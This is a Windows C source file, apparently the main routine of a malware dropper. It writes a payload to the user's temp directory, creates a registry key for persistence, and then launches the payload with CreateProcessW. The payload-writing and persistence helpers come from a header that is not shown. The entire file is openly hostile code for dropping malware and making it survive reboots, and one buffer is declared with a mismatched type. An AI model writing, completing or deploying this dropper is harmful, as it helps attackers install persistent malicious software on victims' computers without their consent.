#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "common.h"

#pragma comment(lib, "Shlwapi.lib")

int main( void )
{
	PVOID pAddress = NULL;
	ULONG Length = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathW" );
		return -1;
	}

	/* creating payload full path */
	StrCatW( &tempPath, PAYLOAD_NAME );

	/* writing payload to temp directory */
	if ( !WritePayloadToTemp( tempPath ) )
	{
		return -1;
	}

	/* writing the persistance registry key */
	if ( !ActivatePersistance() )
	{
		return -1;
	}

	/* ------------------------------------------------------------------------------------------------------------------------------------------------- */

	STARTUPINFOW SiW = {0};
	PROCESS_INFORMATION Pi = {0};

	RtlSecureZeroMemory( &SiW, sizeof( STARTUPINFOW ) );
	RtlSecureZeroMemory( &Pi, sizeof( PROCESS_INFORMATION ) );

	if ( !CreateProcessW( tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &SiW, &Pi ) )
	{
		LOG_ERR( "CreateProcessW" );
		return -1;
	}
	printf( "(+) Executed Payload | PID->%d...\n", Pi.dwProcessId );

	WaitForSingleObjectEx( Pi.hProcess, INFINITE, FALSE );

	CloseHandle( Pi.hProcess );
	CloseHandle( Pi.hThread );

	/* ------------------------------------------------------------------------------------------------------------------------------------------------- */

	return 0;
}
